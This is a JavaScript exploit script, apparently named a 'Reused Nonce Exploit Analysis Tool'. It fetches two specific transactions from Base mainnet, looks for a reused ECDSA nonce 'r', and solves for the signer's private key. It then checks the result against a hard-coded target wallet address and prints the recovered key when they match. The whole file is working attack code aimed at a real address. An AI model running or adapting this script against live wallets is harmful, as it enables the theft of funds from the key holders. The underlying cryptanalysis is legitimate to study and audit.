import { ethers } from "ethers";
import BN from "bn.js";
import elliptic from "elliptic";

const ec = new elliptic.ec("secp256k1");
const n = ec.curve.n;
let provider = new ethers.JsonRpcProvider("https://mainnet.base.org");

const txHashes = [
    "0xb178f3f94cad0cc2b999f9e47c67f3e4bb9854f7e3e789dc31557e8da80f53a1",
    "0x96b49eee981db50b8aa3a7ac4cba907a936a6247732df2b842ab6ea3c336481d"
];
const target = "0x23a402Ba5DDA24991f409258405Ec457FB1B2AD6";

function computeMsgHash(tx) {
    const txData = {
        type: tx.type,
        nonce: tx.nonce,
        maxPriorityFeePerGas: tx.maxPriorityFeePerGas,
        maxFeePerGas: tx.maxFeePerGas,
        gasPrice: tx.gasPrice,
        gasLimit: tx.gasLimit,
        to: tx.to,
        value: tx.value,
        data: tx.data,
        accessList: tx.accessList,
        chainId: tx.chainId
    };

    const ethtx = ethers.Transaction.from(txData);
    return new BN(ethtx.unsignedHash.slice(2), 16);
}


/**
 * Recovers a private key from two transaction hashes that reuse the same 'r' value.
 */
async function recoverPrivKeyFromTxHash(tx1, tx2) {
    try {
        const r = new BN(tx1.signature.r.slice(2), 16);
        const s1 = new BN(tx1.signature.s.slice(2), 16);
        const s2 = new BN(tx2.signature.s.slice(2), 16);
        const h1 = computeMsgHash(tx1);
        const h2 = computeMsgHash(tx2);


        // Potential denominators for k calculation:
        // Case A: same k used for both (s1 - s2)
        // Case B: k and n-k used (s1 + s2)
        const candidates = [
            { den: s1.sub(s2).umod(n), name: "s1 - s2 (Same k)" },
            { den: s1.add(s2).umod(n), name: "s1 + s2 (k and n-k)" }
        ];

        for (const cand of candidates) {
            if (cand.den.isZero()) continue;

            const kNumerator = h1.sub(h2).umod(n);
            const k = kNumerator.mul(cand.den.invm(n)).umod(n);
            const d = s1.mul(k).sub(h1).mul(r.invm(n)).umod(n);

            if (d.isZero() || d.gte(n)) continue;

            const pubKey = ec.keyFromPrivate(d).getPublic(false, "hex");
            const recoveredAddr = ethers.computeAddress("0x" + pubKey);
            const match = recoveredAddr.toLowerCase() === target.toLowerCase();

            console.log(`\n--- Attempt: ${cand.name} ---`);
            console.log("📬 Address: ", recoveredAddr);
            console.log("✅ Match:   ", match);

            if (match) {
                console.log("\n🎊 SUCCESS! Private Key Recovered:");
                console.log("🔐 Key:     ", "0x" + d.toString(16));
                process.exit(0);
            }
        }

        console.log("\n❌ Failed to recover matching private key with current hashes/logic.");
        return null;
    } catch (error) {
        console.error("❌ Recovery Error:", error.message);
        return null;
    }
}

async function main() {
    console.log("======= Reused Nonce Exploit Analysis Tool =======");
    const duplicates = new Map(); // r -> tx pertama
    const txHashesInfo = await Promise.all(
        txHashes.map(txHash => provider.getTransaction(txHash))
    );


    for (const tx of txHashesInfo) {
        if (!tx?.signature?.r) continue;

        const rValue = tx.signature.r;

        if (duplicates.has(rValue)) {
            const prevTx = duplicates.get(rValue);

            console.log(`\n✨ Found 'r' reuse!`);
            console.log(`   "R" yang sama (reused nonce 'k'): ${rValue}`);

            console.log(`\n   Tx1:`);
            console.log(`   Hash: ${prevTx.hash}`);
            console.log(`   R: ${prevTx.signature.r}`);
            console.log(`   S: ${prevTx.signature.s}`);
            console.log(`   V: ${prevTx.signature.v}`);

            console.log(`\n   Tx2:`);
            console.log(`   Hash: ${tx.hash}`);
            console.log(`   R: ${tx.signature.r}`);
            console.log(`   S: ${tx.signature.s}`);
            console.log(`   V: ${tx.signature.v}`);
        } else {
            duplicates.set(rValue, tx);
        }
    }

    recoverPrivKeyFromTxHash(txHashesInfo[0], txHashesInfo[1]);
}
main().catch(err => console.error("Unexpected error in main():", err));